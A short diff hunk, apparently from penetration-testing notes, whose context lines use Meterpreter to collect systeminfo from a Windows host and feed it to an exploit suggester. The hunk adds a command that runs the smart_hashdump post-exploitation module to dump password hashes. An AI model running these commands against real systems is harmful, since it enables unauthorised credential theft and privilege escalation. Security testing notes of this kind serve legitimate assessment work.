@@ -178,4 +178,5 @@ meterpreter > execute -f "cmd.exe /c systeminfo > systeminfo.txt"
 meterpreter > download systeminfo.txt
 $ python windows-exploit-suggester.py --database 2019-09-25-mssb.xls --systeminfo ../systeminfo.txt --quiet  
 
-
+#Get hash windows 
+meterpreter > run post/windows/gather/smart_hashdump
